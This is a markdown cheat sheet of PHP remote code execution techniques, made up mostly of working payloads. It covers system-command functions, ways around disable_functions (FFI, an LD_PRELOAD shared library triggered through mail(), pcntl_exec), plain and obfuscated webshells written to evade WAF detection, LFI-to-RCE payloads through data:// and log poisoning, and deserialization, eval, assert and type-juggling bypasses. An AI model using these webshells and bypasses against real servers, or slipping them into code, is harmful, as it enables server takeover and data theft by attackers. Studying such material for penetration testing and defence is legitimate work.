# PHP RCE Techniques

## Direct Execution Functions

```php
// Functions that execute system commands:
system('id');
exec('id', $output); echo implode("\n", $output);
shell_exec('id');  // alias: `id`
passthru('id');
popen('id', 'r');
proc_open('id', $descriptors, $pipes);

// If direct functions are disabled, check:
phpinfo();  // → disable_functions list
```

## disable_functions Bypass

### FFI (PHP 7.4+, if ffi.enable=true)
```php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id > /tmp/out");
```

### LD_PRELOAD + mail() / putenv()
```php
// 1. Upload malicious shared library
// evil.c:
// #include <stdlib.h>
// void __attribute__((constructor)) init() { system("id > /tmp/out"); }
// gcc -shared -fPIC -o evil.so evil.c

// 2. PHP payload:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com", "", "");  // triggers sendmail → loads LD_PRELOAD
// Alternative triggers: imap_open(), error_log(), mb_send_mail()
```

### Imagick (if available)
```php
// Imagick uses external programs → LD_PRELOAD works
// Or: Imagick::readImage with MSL/MVG for command execution
$img = new Imagick();
$img->readImage('vid:msl:/tmp/exploit.msl');
// exploit.msl triggers file read/write via ImageMagick delegates
```

### proc_open / pcntl_exec (often not disabled)
```php
// proc_open
$process = proc_open('id', [1 => ['pipe', 'w']], $pipes);
echo stream_get_contents($pipes[1]);

// pcntl_exec (replaces current process)
pcntl_exec("/bin/bash", ["-c", "id > /tmp/out"]);
```

### GC / UAF exploits (PHP 7.0-7.3)
```php
// Use-after-free in garbage collector to bypass disable_functions
// Pre-built exploits: https://github.com/mm0r1/exploits
// PHP 7.0-7.3 GC UAF, PHP 7.0-8.0 Backtrace UAF
```

## File Upload → RCE

```php
// Webshells
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?=`$_GET[c]`?>
<?php eval($_POST['code']); ?>

// Obfuscated (bypass WAF/detection)
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
<?php $_=base64_decode('c3lzdGVt');$_($_GET['c']); ?>
<?php @$_[]=$_; $_=@${'_'.'GET'}; @$_[0](@$_[1]); ?>
// Usage: ?0=system&1=id
```

## LFI → RCE Techniques

```php
// PHP wrappers
php://input          // POST body executed as PHP
php://filter/convert.base64-encode/resource=index.php  // source read
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id          // if expect:// wrapper enabled

// Log poisoning (inject PHP in User-Agent → include log)
// Session poisoning (inject PHP in session → include sess file)
// /proc/self/environ (inject PHP in headers → include environ)

// PHP filter chain generator (no file write needed)
// https://github.com/synacktiv/php_filter_chain_generator
```

## Deserialization → RCE

```php
// If unserialize() on user input:
// Use PHPGGC to generate gadget chains
// phpggc Laravel/RCE1 system id
// phpggc Symfony/RCE1 system id
// phpggc WordPress/RCE1 system id

// Phar deserialization (file ops trigger unserialize)
// file_exists('phar://uploads/evil.jpg')
// Any function that touches filesystem can trigger phar://
```

## eval() / preg_replace Injection

```php
// eval() injection
${system('id')}
${phpinfo()}

// preg_replace with /e modifier (PHP < 7.0)
// preg_replace('/.*/e', 'system("id")', '');

// assert() injection (PHP < 7.2 — evaluates string)
assert('1==1; system("id")');

// create_function() injection (deprecated)
create_function('$a', 'return $a; system("id");');
```

## Type Juggling

```php
// Loose comparison (==) bypasses
"0e123" == "0e456"  // true (both = 0 in scientific notation)
"0" == false        // true
"" == 0             // true
"1" == true         // true
[] == false         // true
NULL == false       // true

// MD5 magic hashes (start with 0e, rest all digits)
// MD5("240610708") = 0e462097431906509019562988736854
// MD5("QNKCDZO")   = 0e830400451993494058024219903391
// If: md5($input) == "0" → many magic hashes match

// strcmp bypass
// strcmp([], "password") returns NULL → NULL == 0 is true
// Send parameter as array: user[]=anything
```

## PHP Object Injection

```php
// If unserialize() is called on user input:
// Look for dangerous magic methods:
// __wakeup()    → called on unserialize
// __destruct()  → called on object destruction
// __toString()  → called on string cast
// __call()      → called on undefined method
// __get()       → called on undefined property access

// Chain: find classes with dangerous operations in these methods
// Then craft serialized payload: O:8:"ClassName":1:{s:4:"prop";s:12:"command_here";}
```
